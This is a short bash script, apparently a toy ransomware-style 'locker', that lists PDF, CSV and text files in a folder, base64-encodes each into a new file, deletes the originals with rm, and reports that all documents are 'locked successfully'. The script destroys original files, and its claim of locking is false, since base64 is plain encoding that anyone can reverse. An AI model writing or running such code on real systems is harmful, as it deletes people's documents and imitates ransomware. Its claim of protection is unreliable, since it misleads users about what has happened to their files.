 #!/bin/bash
cd $HOME/sk8Locker
ls *.pdf *.csv *.txt *.txt > dname.txt

input="dname.txt"

while IFS= read -r line; do
  base64 $line > $line.en
  rm -rv $line
done < "$input"
 
 
echo "all documents file locked successfully!"
